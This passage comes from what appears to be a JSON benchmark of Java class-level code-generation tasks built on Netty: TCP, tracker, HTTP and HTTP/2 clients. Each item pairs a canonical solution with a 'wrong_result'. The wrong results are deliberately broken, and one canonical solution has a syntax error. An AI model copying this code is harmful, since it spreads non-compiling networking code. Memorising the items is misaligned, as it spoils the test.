      this.bootstrap = new Bootstrap()\n                .group(this.eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.MESSAGE_SIZE_ESTIMATOR, MantisMessageSizeEstimator.DEFAULT)\n                .option(ChannelOption.WRITE_BUFFER_WATER_MARK,\n                        new WriteBufferWaterMark(\n                                lowWriteBufferWatermark, highWriteBufferWatermark))\n                .handler(new HttpEventChannelInitializer(\n                        registry, config, encoderEventLoopGroup));\n        this.channels = new ConcurrentHashMap<>();\n\n        Runtime.getRuntime().addShutdownHook(new Thread(this.eventLoopGroup::shutdownGracefully));\n    }\n\n    Channel findOrCreate(InetSocketAddress address) {\n        Channel channel = find(address);\n\n        if (channel == null) {\n            LOG.debug(\"creating new channel for {}\", address);\n            ChannelFuture channelFuture = bootstrap.connect(address);\n            channel = channelFuture.channel();\n\n            channels.put(getHostPortString(address), channel);\n\n            channel.closeFuture().addListener(future -> {\n                LOG.debug(\"closing channel for {}\", address);\n                channels.remove(getHostPortString(address));\n                liveConnections.set((double) channels.size());\n            });\n\n            channelFuture.addListener(future -> {\n                if (future.isSuccess()) {\n                    LOG.debug(\"connection success for {}\", address);\n                    connectionSuccess.increment();\n                    liveConnections.set((double) channels.size());\n                } else {\n                    LOG.debug(\"failed to connect to {}\", address);\n                    connectionFailure.increment();\n                }\n            });\n        }\n\n        nettyChannelBufferSize.set(highWriteBufferWatermark - channel.bytesBeforeUnwritable());\n\n        return channel;\n    }\n\n    private Channel find(InetSocketAddress address) {\n        return channels.get(getHostPortString(address));\n    }\n\n    void close(InetSocketAddress address) {\n        Channel channel = find(address);\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    private String getHostPortString(InetSocketAddress address) {\n        return address.getHostString() + ':' + address.getPort();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\n\npublic class HttpEventChannelManager {\n    private final Logger LOG = LoggerFactory.getLogger(HttpEventChannelManager.class);\n    private final Counter connectionSuccess;\n    private final Counter connectionFailure;\n    private final AtomicDouble liveConnections;\n    private final AtomicDouble nettyChannelBufferSize;\n    private final int lowWriteBufferWatermark;\n    private final int highWriteBufferWatermark;\n    private final EventLoopGroup eventLoopGroup;\n    private final EventLoopGroup encoderEventLoopGroup;\n    private final Bootstrap bootstrap;\n    private final ConcurrentMap<String, Channel> channels;\n\n    public HttpEventChannelManager(Registry registry, MrePublishConfiguration config) {\n        this.connectionSuccess = registry.counter(\"http_event_channel_success\");\n        this.connectionFailure = registry.counter(\"http_event_channel_failure\");\n        this.liveConnections = new AtomicDouble(0);\n        this.nettyChannelBufferSize = new AtomicDouble(0);\n        this.lowWriteBufferWatermark = config.getLowWriteBufferWatermark();\n        this.highWriteBufferWatermark = config.getHighWriteBufferWatermark();\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.encoderEventLoopGroup = config.isEnableCompression() ? new NioEventLoopGroup() : null;\n        this.bootstrap = new Bootstrap();\n        this.channels = new ConcurrentHashMap<>();\n\n        bootstrap.group(eventLoopGroup);\n        bootstrap.channel(NioSocketChannel.class);\n        bootstrap.option(ChannelOption.WRITE_BUFFER_WATERMARK, new WriteBufferWaterMarkHandler(lowWriteBufferWatermark, highWriteBufferWatermark));\n    }\n\n    public Channel findOrCreate(InetSocketAddress address) {\n        String key = getHostPortString(address);\n        Channel channel = channels.get(key);\n        if (channel != null) {\n            return channel;\n        }\n        try {\n            ChannelFuture future = bootstrap.connect(address).sync();\n            Channel newChannel = future.channel();\n            channels.put(key, newChannel);\n            liveConnections.addAndGet(1);\n            connectionSuccess.increment();\n            return newChannel;\n        } catch (Exception e) {\n            LOG.error(\"Failed to connect to {}\", address, e);\n            connectionFailure.increment();\n            return null;\n        }\n    }\n\n    public Channel find(InetSocketAddress address) {\n        String key = getHostPortString(address);\n        return channels.get(key);\n    }\n\n    public void close(InetSocketAddress address) {\n        String key = getHostPortString(address);\n        Channel channel = channels.remove(key);\n        if (channel != null) {\n            channel.close();\n            liveConnections.addAndGet(-1);\n        }\n    }\n\n    private String getHostPortString(InetSocketAddress address) {\n        return address.getHostString() + \":\" + address.getPort();\n    }\n}"
  },
  {
    "Task_id": 142,
    "Instruction": "Task Description: Implement a Netty-based TCP client for tracking device communication that supports secure connections and periodic reconnection.\n\nClass Description: The TrackerClient class is an abstract implementation of a TCP client using Netty framework for communicating with tracking devices. It handles secure connections (SSL/TLS), manages connection lifecycle, and supports periodic reconnection. The class serves as a base for specific protocol implementations.\n\nAttributes:\n- secure: [boolean] - Indicates whether SSL/TLS encryption should be used\n- interval: [long] - Reconnection interval in seconds (0 means no reconnection)\n- bootstrap: [Bootstrap] - Netty bootstrap instance for client configuration\n- port: [int] - Target server port number\n- address: [String] - Target server address\n- devices: [String[]] - Array of device identifiers to track\n- channelGroup: [ChannelGroup] - Manages all active channels\n\nMethods:\n- TrackerClient([Config] config, [String] protocol) -> [void] - Constructor that initializes the client with configuration and protocol settings\n- addProtocolHandlers([PipelineBuilder] pipeline, [Config] config) -> [void] - Abstract method to be implemented by subclasses for protocol-specific handlers\n- start() -> [void] - Starts the client and establishes connection to server\n- stop() -> [void] - Stops the client and closes all connections\n- isDatagram() -> [boolean] - Returns false indicating this is a TCP client\n- isSecure() -> [boolean] - Returns whether SSL/TLS is enabled\n- getDevices() -> [String[]] - Returns array of device identifiers\n- getChannelGroup() -> [ChannelGroup] - Returns the channel group managing all connections",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.concurrent.Future;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport io.netty.util.concurrent.GlobalEventExecutor;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport java.util.concurrent.TimeUnit;\n\npublic abstract class TrackerClient implements TrackerConnector {\n\n    private final boolean secure;\n    private final long interval;\n    private final Bootstrap bootstrap;\n    private final int port;\n    private final String address;\n    private final String[] devices;\n    private final ChannelGroup channelGroup = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);\n\n    public TrackerClient(Config config, String protocol) {\n        secure = config.getBoolean(Keys.PROTOCOL_SSL.withPrefix(protocol));\n        interval = config.getLong(Keys.PROTOCOL_INTERVAL.withPrefix(protocol));\n        address = config.getString(Keys.PROTOCOL_ADDRESS.withPrefix(protocol));\n        port = config.getInteger(Keys.PROTOCOL_PORT.withPrefix(protocol), secure ? 443 : 80);\n        devices = config.getString(Keys.PROTOCOL_DEVICES.withPrefix(protocol)).split(\"[, ]\");\n\n        BasePipelineFactory pipelineFactory = new BasePipelineFactory(this, config, protocol) {\n            @Override\n            protected void addTransportHandlers(PipelineBuilder pipeline) {\n                try {\n                    if (isSecure()) {\n                        SSLEngine engine = SSLContext.getDefault().createSSLEngine();\n                        engine.setUseClientMode(true);\n                        pipeline.addLast(new SslHandler(engine));\n                    }\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }\n            }\n\n            @Override\n            protected void addProtocolHandlers(PipelineBuilder pipeline) {\n                try {\n                    TrackerClient.this.addProtocolHandlers(pipeline, config);\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }\n            }\n        };\n\n        bootstrap = new Bootstrap()\n                .group(EventLoopGroupFactory.getWorkerGroup())\n                .channel(NioSocketChannel.class)\n                .handler(pipelineFactory);\n    }\n\n    protected abstract void addProtocolHandlers(PipelineBuilder pipeline, Config config) throws Exception;\n\n    @Override\n    public void start() throws Exception {\n        bootstrap.connect(address, port)\n                .syncUninterruptibly().channel().closeFuture().addListener(new GenericFutureListener<>() {\n                    @Override\n                    public void operationComplete(Future<? super Void> future) {\n                        if (interval > 0) {\n                            GlobalEventExecutor.INSTANCE.schedule(() -> {\n                                bootstrap.connect(address, port)\n                                        .syncUninterruptibly().channel().closeFuture().addListener(this);\n                            }, interval, TimeUnit.SECONDS);\n                        }\n                    }\n                });\n    }\n\n    @Override\n    public void stop() {\n        channelGroup.close().awaitUninterruptibly();\n    }\n\n    @Override\n    public boolean isDatagram() {\n        return false;\n    }\n\n    @Override\n    public boolean isSecure() {\n        return secure;\n    }\n\n    public String[] getDevices() {\n        return devices;\n    }\n\n    @Override\n    public ChannelGroup getChannelGroup() {\n        return channelGroup;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public abstract class TrackerClient {\n    private final boolean secure;\n    private final long interval;\n    private final Bootstrap bootstrap;\n    private final int port;\n    private final String address;\n    private final String[] devices;\n    private final ChannelGroup channelGroup;\n\n    public TrackerClient(Config config, String protocol) {\n        this.secure = config.isSecure();\n        this.interval = config.getInterval();\n        this.port = config.getPort();\n        this.address = config.getAddress();\n        this.devices = config.getDevices();\n        this.channelGroup = new DefaultChannelGroup(EventLoopGroup.INSTANCE);\n\n        bootstrap = new Bootstrap();\n        bootstrap.group(new NioEventLoopGroup());\n        if (secure) {\n            SslContext sslCtx = SslContext.newClientContext();\n            bootstrap.pipeline().addLast(new SslHandler(sslCtx));\n        }\n        addProtocolHandlers(bootstrap.pipeline(), config);\n    }\n\n    protected abstract void addProtocolHandlers(ChannelPipeline pipeline, Config config);\n\n    public void start() {\n        ChannelFuture future = bootstrap.connect(address, port).addListener((ChannelFutureListener) future -> {\n            if (future.isSuccess()) {\n                Channel channel = future.channel();\n                channelGroup.add(channel);\n            } else {\n                if (interval > 0) {\n                    ScheduledExecutorService scheduler = new ScheduledThreadPoolExecutor(1, new DefaultThreadFactory(\"ReconnectScheduler\"));\n                    scheduler.schedule(() -> start(), interval, TimeUnit.SECONDS);\n                }\n            }\n        });\n    }\n\n    public void stop() {\n        channelGroup.close().awaitUninterruptibly();\n        channelGroup.dispose();\n    }\n\n    public boolean isDatagram() {\n        return false;\n    }\n\n    public boolean isSecure() {\n        return secure;\n    }\n\n    public String[] getDevices() {\n        return devices;\n    }\n\n    public ChannelGroup getChannelGroup() {\n        return channelGroup;\n    }\n}"
  },
  {
    "Task_id": 143,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client for HTTP communication, supporting SSL/TLS encryption, chunked content transfer, and asynchronous request/response handling.\n\nClass Description: The NettyClient class establishes and manages TCP connections to a remote server using Netty's asynchronous I/O framework. It handles HTTP requests and responses, supports SSL/TLS encryption, and provides callback mechanisms for asynchronous processing.\n\nAttributes:\n- hostname: String - The target server hostname\n- port: int - The target server port\n- group: EventLoopGroup - Manages client-side I/O threads\n- b: Bootstrap - Configures Netty client behavior\n- responseParts: Queue<HttpObject> - Stores received HTTP response parts\n- callbackInvoked: AtomicBoolean - Tracks callback invocation status\n- communicationHandler: CommunicationHandler - Processes incoming HTTP messages\n- isOpen: AtomicBoolean - Tracks client connection state\n- request: HttpRequest - Current HTTP request being sent\n- content: ChunkedInput<HttpContent> - Optional request content\n- responseFuture: FutureResult<ResponseParts> - Future for response handling\n- callback: Callback<ResponseParts> - Callback for response handling\n- channelConnectFuture: ChannelFuture - Future for channel connection\n- exception: Exception - Stores any encountered exceptions\n- isKeepAlive: boolean - Tracks HTTP keep-alive status\n\nMethods:\n- NettyClient(String, int, SSLFactory) -> void - Constructor that initializes the client with hostname, port, and optional SSL factory\n- sendRequest(HttpRequest, ChunkedInput<HttpContent>, Callback<ResponseParts>) -> Future<ResponseParts> - Sends an HTTP request with optional content and registers a callback\n- close() -> void - Gracefully shuts down the client and releases resources\n- resetState() -> void - Resets internal state for new requests\n- createChannel() -> void - Creates a new channel connection to the server\n- invokeFutureAndCallback(String) -> void - Invokes the response future and callback with results\n- CommunicationHandler (inner class) - Handles incoming HTTP messages and exceptions\n\nInner Classes:\n- CommunicationHandler: SimpleChannelInboundHandler<HttpObject> - Processes HTTP responses and exceptions\n- ResponseParts: static class - Wrapper for HTTP response parts and completion context",
    "Canonical_solution": "import com.github.ambry.commons.SSLFactory;\nimport com.github.ambry.commons.Callback;\nimport com.github.ambry.router.FutureResult;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpObject;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpResponse;\nimport io.netty.handler.codec.http.HttpUtil;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.stream.ChunkedInput;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.ReferenceCountUtil;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.io.Closeable;\nimport java.util.LinkedList;\nimport java.util.Queue;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class NettyClient implements Closeable {\n  private final String hostname;\n  private final int port;\n  private final EventLoopGroup group = new NioEventLoopGroup();\n  private final Bootstrap b = new Bootstrap();\n  private final Queue<HttpObject> responseParts = new LinkedList<HttpObject>();\n  private final AtomicBoolean callbackInvoked = new AtomicBoolean(false);\n  private final CommunicationHandler communicationHandler = new CommunicationHandler();\n  private final AtomicBoolean isOpen = new AtomicBoolean(true);\n\n  private HttpRequest request;\n  private ChunkedInput<HttpContent> content;\n  private FutureResult<ResponseParts> responseFuture;\n  private Callback<ResponseParts> callback;\n  private volatile ChannelFuture channelConnectFuture;\n  private volatile Exception exception = null;\n  private volatile boolean isKeepAlive = false;\n\n  public NettyClient(final String hostname, final int port, final SSLFactory sslFactory) throws InterruptedException {\n    this.hostname = hostname;\n    this.port = port;\n    b.group(group).channel(NioSocketChannel.class).handler(new ChannelInitializer<SocketChannel>() {\n      @Override\n      public void initChannel(SocketChannel ch) throws Exception {\n        ChannelPipeline pipeline = ch.pipeline();\n        if (sslFactory != null) {\n          pipeline.addLast(\"sslHandler\",\n              new SslHandler(sslFactory.createSSLEngine(hostname, port, SSLFactory.Mode.CLIENT)));\n        }\n        pipeline.addLast(new HttpClientCodec()).addLast(new ChunkedWriteHandler()).addLast(communicationHandler);\n      }\n    });\n    createChannel();\n  }\n\n  public Future<ResponseParts> sendRequest(HttpRequest request, ChunkedInput<HttpContent> content,\n      Callback<ResponseParts> callback) {\n    this.request = request;\n    this.content = content;\n    this.callback = callback;\n    resetState();\n    channelConnectFuture.addListener(new GenericFutureListener<ChannelFuture>() {\n      @Override\n      public void operationComplete(ChannelFuture future) {\n        if (future.isSuccess()) {\n          future.channel().write(request).addListener(new GenericFutureListener<ChannelFuture>() {\n            @Override\n            public void operationComplete(ChannelFuture future) {\n              if (!future.isSuccess()) {\n                exception = (Exception) future.cause();\n                invokeFutureAndCallback(\"WriteResultListener::operationComplete\");\n              }\n            }\n          });\n          if (content != null) {\n            future.channel().write(content).addListener(new GenericFutureListener<ChannelFuture>() {\n              @Override\n              public void operationComplete(ChannelFuture future) {\n                if (!future.isSuccess()) {\n                  exception = (Exception) future.cause();\n                  invokeFutureAndCallback(\"WriteResultListener::operationComplete\");\n                }\n              }\n            });\n          }\n          future.channel().flush();\n        } else {\n          exception = (Exception) future.cause();\n          invokeFutureAndCallback(\"RequestSender::operationComplete\");\n        }\n      }\n    });\n    return responseFuture;\n  }\n\n  @Override\n  public void close() {\n    if (isOpen.compareAndSet(true, false) {\n      group.shutdownGracefully();\n    }\n  }\n\n  private void resetState() {\n    responseFuture = new FutureResult<>();\n    responseParts.clear();\n    exception = null;\n    callbackInvoked.set(false);\n  }\n\n  private void createChannel() throws InterruptedException {\n    channelConnectFuture = b.connect(hostname, port);\n    channelConnectFuture.channel().closeFuture().addListener(new GenericFutureListener<ChannelFuture>() {\n      @Override\n      public void operationComplete(ChannelFuture future) throws InterruptedException {\n        if (isOpen.get()) {\n          createChannel();\n        }\n        invokeFutureAndCallback(\"ChannelCloseListener::operationComplete\");\n      }\n    });\n  }\n\n  private void invokeFutureAndCallback(String completionContext) {\n    if (callbackInvoked.compareAndSet(false, true)) {\n      responseFuture.done(new ResponseParts(responseParts, completionContext), exception);\n      if (callback != null) {\n        callback.onCompletion(new ResponseParts(responseParts, completionContext), exception);\n      }\n    }\n  }\n\n  @ChannelHandler.Sharable\n  private class CommunicationHandler extends SimpleChannelInboundHandler<HttpObject> {\n    @Override\n    public void channelRead0(ChannelHandlerContext ctx, HttpObject in) {\n      responseParts.offer(ReferenceCountUtil.retain(in));\n      if (in instanceof HttpResponse && in.decoderResult().isSuccess()) {\n        isKeepAlive = HttpUtil.isKeepAlive((HttpResponse) in);\n      } else if (in.decoderResult().isFailure()) {\n        Throwable cause = in.decoderResult().cause();\n        if (cause instanceof Exception) {\n          exception = (Exception) cause;\n        } else {\n          exception =\n              new Exception(\"Encountered Throwable when trying to decode response. Message: \" + cause.getMessage());\n        }\n        invokeFutureAndCallback(\"CommunicationHandler::channelRead0 - decoder failure\");\n      }\n      if (in instanceof LastHttpContent) {\n        if (isKeepAlive) {\n          invokeFutureAndCallback(\"CommunicationHandler::channelRead0 - last content\");\n        } else {\n          ctx.close();\n        }\n      }\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) {\n      ctx.close();\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n      if (cause instanceof Exception) {\n        exception = (Exception) cause;\n        ctx.close();\n      } else {\n        ctx.fireExceptionCaught(cause);\n      }\n    }\n  }\n\n  public static class ResponseParts {\n    public final Queue<HttpObject> queue;\n    public final String completionContext;\n\n    private ResponseParts(Queue<HttpObject> queue, String completionContext) {\n      this.queue = queue;\n      this.completionContext = completionContext;\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.HttpObject;\nimport io.netty.handler.codec.http.HttpResponse;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport io.netty.handler.codec.http.ChunkedInput;\nimport io.netty.buffer.ByteBuf;\nimport java.util.Queue;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class NettyClient {\n    private final String hostname;\n    private final int port;\n    private final EventLoopGroup group;\n    private final Bootstrap b;\n    private final Queue<HttpObject> responseParts = new java.util.LinkedList<>();\n    private final AtomicBoolean callbackInvoked = new AtomicBoolean(false);\n    private final CommunicationHandler communicationHandler = new CommunicationHandler();\n    private final AtomicBoolean isOpen = new AtomicBoolean(false);\n    private final HttpRequest request;\n    private final ChunkedInput<HttpContent> content;\n    private final FutureResult<ResponseParts> responseFuture;\n    private final Callback<ResponseParts> callback;\n    private final ChannelFuture channelConnectFuture;\n    private final Exception exception;\n    private final boolean isKeepAlive;\n\n    public NettyClient(String hostname, int port, SSLFactory sslFactory) {\n        this.hostname = hostname;\n        this.port = port;\n        this.group = new NioEventLoopGroup();\n        this.b = new Bootstrap();\n        this.b.group(group);\n        this.b.channel(SocketChannel.class);\n        this.b.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(new SslHandler(sslFactory.getSslContext()));\n                ch.pipeline().addLast(communicationHandler);\n            }\n        });\n        this.request = null;\n        this.content = null;\n        this.responseFuture = new FutureResult<>();\n        this.callback = null;\n        this.channelConnectFuture = null;\n        this.exception = null;\n        this.isKeepAlive = false;\n    }\n\n    public Future<ResponseParts> sendRequest(HttpRequest request, ChunkedInput<HttpContent> content, Callback<ResponseParts> callback) {\n        this.request = request;\n        this.content = content;\n        this.callback = callback;\n        this.responseFuture = new FutureResult<>();\n        this.channelConnectFuture = b.connect(hostname, port).addListener(future -> {\n            if (future.isSuccess()) {\n                isOpen.set(true);\n                b.writeAndFlush(request);\n                if (content != null) {\n                    b.write(content);\n                }\n            } else {\n                exception = future.cause();\n                callbackInvoked.set(true);\n                invokeFutureAndCallback(\"Connection failed\");\n            }\n        });\n        return responseFuture;\n    }\n\n    public void close() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n        if (channelConnectFuture != null) {\n            channelConnectFuture.cancel(true);\n        }\n    }\n\n    public void resetState() {\n        responseParts.clear();\n        callbackInvoked.set(false);\n        isOpen.set(false);\n        request = null;\n        content = null;\n        responseFuture = new FutureResult<>();\n        callback = null;\n        channelConnectFuture = null;\n        exception = null;\n        isKeepAlive = false;\n    }\n\n    private void createChannel() {\n        b.connect(hostname, port).addListener(future -> {\n            if (future.isSuccess()) {\n                isOpen.set(true);\n                b.writeAndFlush(request);\n                if (content != null) {\n                    b.write(content);\n                }\n            } else {\n                exception = future.cause();\n                callbackInvoked.set(true);\n                invokeFutureAndCallback(\"Connection failed\");\n            }\n        });\n    }\n\n    private void invokeFutureAndCallback(String result) {\n        if (!callbackInvoked.get()) {\n            callbackInvoked.set(true);\n            responseFuture.setResult(new ResponseParts(responseParts, result));\n            if (callback != null) {\n                callback.onResponse(responseParts);\n            }\n        }\n    }\n\n    private class CommunicationHandler extends SimpleChannelInboundHandler<HttpObject> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, HttpObject msg) throws Exception {\n            if (msg instanceof HttpResponse) {\n                responseParts.add(msg);\n            } else if (msg instanceof LastHttpContent) {\n                responseParts.add(msg);\n                invokeFutureAndCallback(\"Response completed\");\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            if (!callbackInvoked.get()) {\n                callbackInvoked.set(true);\n                responseFuture.setException(cause);\n                if (callback != null) {\n                    callback.onResponse(null);\n                }\n            }\n        }\n    }\n\n    private static class ResponseParts {\n        private final Queue<HttpObject> parts;\n        private final String completionContext;\n\n        public ResponseParts(Queue<HttpObject> parts, String completionContext) {\n            this.parts = parts;\n            this.completionContext = completionContext;\n        }\n\n        public Queue<HttpObject> getParts() {\n            return parts;\n        }\n\n        public String getCompletionContext() {\n            return completionContext;\n        }\n    }\n\n    private static class FutureResult<T> implements Future<T> {\n        private final AtomicReference<T> result = new AtomicReference<>();\n        private final AtomicBoolean done = new AtomicBoolean(false);\n        private final AtomicReference<Exception> exception = new AtomicReference<>();\n\n        @Override\n        public boolean isDone() {\n            return done.get();\n        }\n\n        @Override\n        public boolean isCancelled() {\n            return false;\n        }\n\n        @Override\n        public T get() throws InterruptedException, ExecutionException {\n            if (done.get()) {\n                if (exception.get() != null) {\n                    throw new ExecutionException(exception.get(), \"Exception occurred\");\n                }\n                return result.get();\n            }\n            throw new ExecutionException(new RuntimeException(\"Not yet completed\"), \"Future not completed\");\n        }\n\n        @Override\n        public T get(long timeout, java.util.concurrent.TimeUnit unit) throws InterruptedException, ExecutionException {\n            return get();\n        }\n\n        @Override\n        public void cancel(boolean mayInterruptIfRunning) {\n            // Not implemented\n        }\n\n        @Override\n        public boolean cancel(boolean mayInterruptIfRunning) {\n            return false;\n        }\n\n        public void setResult(T result) {\n            this.result.set(result);\n            this.done.set(true);\n        }\n\n        public void setException(Exception exception) {\n            this.exception.set(exception);\n            this.done.set(true);\n        }\n    }\n\n    @FunctionalInterface\n    public interface Callback<T> {\n        void onResponse(T response);\n    }\n}\n```"
  },
  {
    "Task_id": 145,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 client using Netty framework to establish TCP connections, send HTTP/2 requests, and handle responses.\n\nClass Description: The Http2Client class provides functionality to connect to an HTTP/2 server, send requests, and disconnect gracefully. It uses Netty's non-blocking I/O capabilities for efficient network communication.\n\nAttributes:\n- HOST: [String] - The host address to connect to (default: \"127.0.0.1\")\n- PORT: [int] - The port number to connect to (default: 8080)\n- URL: [String] - The endpoint path for HTTP requests (default: \"/whatever\")\n- workerGroup: [EventLoopGroup] - Manages client-side I/O threads\n- initializer: [Http2ClientInitializer] - Configures the client pipeline\n- channel: [Channel] - Represents the network communication channel\n\nMethods:\n- connect(): [void] - Establishes a TCP connection to the specified host and port using Netty's Bootstrap\n- sendRequest(): [void] - Sends an HTTP/2 request to the connected server and waits for responses\n- disconnect(): [void] - Closes the connection and releases resources gracefully",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpScheme;\nimport io.netty.handler.codec.http2.HttpConversionUtil;\nimport io.netty.util.AsciiString;\nimport java.util.concurrent.TimeUnit;\n\npublic final class Http2Client {\n\n    private static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    private static final int PORT = 8080;\n    private static final String URL = System.getProperty(\"url\", \"/whatever\");\n\n    private EventLoopGroup workerGroup;\n    private Http2ClientInitializer initializer;\n    private Channel channel;\n\n    public void connect() throws Exception {\n        workerGroup = new NioEventLoopGroup();\n        initializer = new Http2ClientInitializer(Integer.MAX_VALUE);\n\n        Bootstrap b = new Bootstrap();\n        b.group(workerGroup);\n        b.channel(NioSocketChannel.class);\n        b.option(ChannelOption.SO_KEEPALIVE, true);\n        b.remoteAddress(HOST, PORT);\n        b.handler(initializer);\n\n        channel = b.connect().syncUninterruptibly().channel();\n        System.out.println(\"Connected to [\" + HOST + ':' + PORT + ']');\n    }\n\n    public void sendRequest() throws Exception {\n        Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();\n        http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);\n\n        HttpResponseHandler responseHandler = initializer.responseHandler();\n        int streamId = 3;\n        HttpScheme scheme = HttpScheme.HTTP;\n        AsciiString hostName = new AsciiString(HOST + ':' + PORT);\n        System.err.println(\"Sending request(s)...\");\n\n        if (URL != null) {\n            FullHttpRequest request = new DefaultFullHttpRequest(HTTP_1_1, GET, URL, Unpooled.EMPTY_BUFFER);\n            request.headers().add(HttpHeaderNames.HOST, hostName);\n            request.headers().add(HttpConversionUtil.ExtensionHeaderNames.SCHEME.text(), scheme.name());\n            request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n            request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);\n            responseHandler.put(streamId, channel.write(request), channel.newPromise());\n        }\n\n        channel.flush();\n        responseHandler.awaitResponses(5, TimeUnit.SECONDS);\n        System.out.println(\"Finished HTTP/2 request(s)\");\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class Http2Client {\n    private final String host;\n    private final int port;\n    private final String url;\n    private final EventLoopGroup workerGroup;\n    private final Http2ClientInitializer initializer;\n    private Channel channel;\n\n    public Http2Client() {\n        this.host = \"127.0.0.1\";\n        this.port = 8080;\n        this.url = \"/whatever\";\n        this.workerGroup = new NioEventLoopGroup();\n        this.initializer = new Http2ClientInitializer();\n    }\n\n    public void connect() {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .handler(initializer);\n        channel = bootstrap.bind(port).sync().channel();\n    }\n\n    public void sendRequest() {\n        HttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_2_0, HttpMethod.GET, url);\n        request.headers().set(HttpHeaderNames.HOST, host);\n        channel.writeAndFlush(request);\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close().sync();\n        }\n        workerGroup.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 147,
